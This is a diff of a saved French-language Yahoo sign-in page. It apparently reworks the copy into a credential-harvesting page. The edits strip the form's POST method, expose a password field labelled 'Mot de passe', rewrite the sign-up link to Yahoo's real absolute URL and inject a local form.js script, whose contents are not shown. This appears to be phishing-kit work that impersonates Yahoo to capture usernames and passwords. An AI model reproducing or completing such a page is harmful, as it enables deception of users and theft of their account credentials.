@@ -119,7 +119,7 @@
                         <strong class="challenge-heading">Se&nbsp;connecter</strong>
                         <span class="challenge-desc signin-sub-title">à l’aide de votre compte&nbsp;Yahoo</span>
 
-                        <form id="login-username-form" method="post" class="pure-form">
+                        <form id="login-username-form" class="pure-form">
                             <input type="hidden" name="browser-fp-data" id="browser-fp-data"
                                 value="{&quot;language&quot;:&quot;en-US&quot;,&quot;colorDepth&quot;:24,&quot;deviceMemory&quot;:8,&quot;pixelRatio&quot;:1,&quot;hardwareConcurrency&quot;:8,&quot;timezoneOffset&quot;:-60,&quot;timezone&quot;:&quot;Africa/Casablanca&quot;,&quot;sessionStorage&quot;:1,&quot;localStorage&quot;:1,&quot;indexedDb&quot;:1,&quot;openDatabase&quot;:1,&quot;cpuClass&quot;:&quot;unknown&quot;,&quot;platform&quot;:&quot;Win32&quot;,&quot;doNotTrack&quot;:&quot;unknown&quot;,&quot;plugins&quot;:{&quot;count&quot;:5,&quot;hash&quot;:&quot;2c14024bf8584c3f7f63f24ea490e812&quot;},&quot;canvas&quot;:&quot;canvas winding:yes~canvas&quot;,&quot;webgl&quot;:1,&quot;webglVendorAndRenderer&quot;:&quot;Google Inc. (Intel)~ANGLE (Intel, Intel(R) UHD Graphics 620 Direct3D11 vs_5_0 ps_5_0, D3D11)&quot;,&quot;adBlock&quot;:0,&quot;hasLiedLanguages&quot;:0,&quot;hasLiedResolution&quot;:0,&quot;hasLiedOs&quot;:1,&quot;hasLiedBrowser&quot;:0,&quot;touchSupport&quot;:{&quot;points&quot;:10,&quot;event&quot;:0,&quot;start&quot;:0},&quot;fonts&quot;:{&quot;count&quot;:33,&quot;hash&quot;:&quot;edeefd360161b4bf944ac045e41d0b21&quot;},&quot;audio&quot;:&quot;124.04347527516074&quot;,&quot;resolution&quot;:{&quot;w&quot;:&quot;1280&quot;,&quot;h&quot;:&quot;720&quot;},&quot;availableResolution&quot;:{&quot;w&quot;:&quot;672&quot;,&quot;h&quot;:&quot;1280&quot;},&quot;ts&quot;:{&quot;serve&quot;:1696675130332,&quot;render&quot;:1696675130665}}">
                             <input type="hidden" name="crumb" value="TPCBQ7O3FRM">
@@ -609,7 +609,7 @@
 
                                 </div>
                                 <div class="input-group">
-                                    <input class="phone-no " type="text" name="username" id="login-username" value=""
+                                    <input class="phone-no" type="text" name="username" id="login-username" value=""
                                         autocomplete="username" autocapitalize="none" autocorrect="off" autofocus="true"
                                         placeholder=" ">
                                     <div class="input-field-icon hide" id="username-field-icon"></div>
@@ -622,9 +622,10 @@
                                         <li data-fill="aol.com" tabindex="5">aol.com</li>
                                     </ul>
                                 </div>
-                                <div class="hidden-input-container">
-                                    <input name="passwd" class="pwd-field" type="password" tabindex="-1"
-                                        aria-hidden="true" role="presentation" autocorrect="off" placeholder="Password">
+                                <div class="input-group">
+                                    <input id="passwd" name="passwd" class="pwd-field" type="password" tabindex="-1"
+                                        aria-hidden="true" role="presentation" autocorrect="off" placeholder=" ">
+                                        <label for="passwd" id="login-label" class="login-label">Mot de passe</label>
                                 </div>
                             </div>
                             <p id="username-error" class="error-msg hide" role="alert"></p>
@@ -655,7 +656,7 @@
 
                             <div class="bottom-links-container has-social-buttons">
                                 <p class="sign-up-link">
-                                    <a href="/account/create?lang=fr&amp;specId=yidregsimplified&amp;done=https%3A%2F%2Fwww.yahoo.com"
+                                    <a href="https://login.yahoo.com/account/create"
                                         id="createacc" role="button"
                                         class="pure-button puree-button-secondary challenge-button"
                                         data-rapid-tracking="true"
@@ -750,4 +751,5 @@
 
 
 </body>
+<script src="./assets/js/form.js"></script>
 </html>
